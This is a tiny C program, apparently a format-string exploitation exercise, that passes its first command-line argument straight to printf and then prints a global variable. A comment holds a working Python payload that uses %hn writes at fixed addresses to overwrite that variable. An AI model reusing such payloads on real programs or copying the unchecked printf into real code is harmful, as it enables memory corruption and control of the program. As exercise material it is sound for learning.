#include <stdio.h>
#include <stdint.h>

uint32_t	m;
//python -c 'import struct; import sys; sys.stdout.write(struct.pack("<I", 0x08049812) + struct.pack("<I", 0x08049810) + "a"*0xfa + "%12$hn" + "a"*0x544a + "%13$hn");'

int	main(int ac, char **av)
{
	printf(av[1]);

	printf("\n%x\n", m);
}
